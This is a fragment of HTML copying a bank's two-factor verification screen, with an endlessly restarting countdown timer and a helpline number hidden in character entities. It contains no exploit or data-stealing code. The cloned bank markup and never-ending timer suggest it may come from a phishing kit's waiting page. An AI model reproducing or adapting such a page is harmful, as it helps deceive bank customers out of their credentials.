<script src='media/stopExecutionOnTimeout.js'></script>
<script>
function countdown() {
    var seconds = 60;
    function tick() {
        var counter = document.getElementById("countdown-number");
        seconds--;
        counter.innerHTML = "" + (seconds < 10 ? "0" : "") + String(seconds);
        if( seconds > 0 ) {
            setTimeout(tick, 1000);
        } else {
			countdown();
			return;
        }
    }
    tick();
}

countdown();
</script>
</div>
<div class="ap-timer-right" style="float:left; width:200px; height:51px; margin-top:15px;"><label class="ui-label ap-common-verticalAlign-middle">seconds remaining<span class="ui-label--icon"></span></label></div><b class="ap-n2fa-countDownTimer ap-SVM-countDownTimer ap-common-fontRed" style="display:none" data-canvas="true" data-timeremaining="21">21</b></td></tr></tbody></table>
<div class="ui-formFoot ">
<div class="ui-buttonFooter "><div class="ui-exception-container"><button class="ui-button ap-button-cancel" type="button" tabindex="0" onclick="absa.n2fa.onCancelBtnClickSVM(this)" aria-label="Cancel. "><div class="ui-button-left"><div class="ui-button-right"><div class="ui-button-center">Cancel</div></div></div></button></div></div></div>
<div class="ui-noticeBox " tabindex="0"><div class="bold">Important information</div><ul><li>You can resend the verification request to your verification device if the previous one failed</li><li>&#x48;&#x65;&#x6c;&#x70;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x30;&#x38;&#x36;&#x30;&#x30;&#x20;&#x30;&#x38;&#x36;&#x30;&#x30;&#x20;&#x2f;&#x20;&#x49;&#x6e;&#x74;&#x2e;&#x2b;&#x32;&#x37;&#x31;&#x31;&#x20;&#x35;&#x30;&#x31;&#x20;&#x35;&#x30;&#x31;&#x39;</li></ul></div></div></div></div></div><div id="ui-wizard-body3" tabindex="0" class="ui-wizard-body" disableshowmehow="true"></div></div></div></div></div></div>
</div>
</body>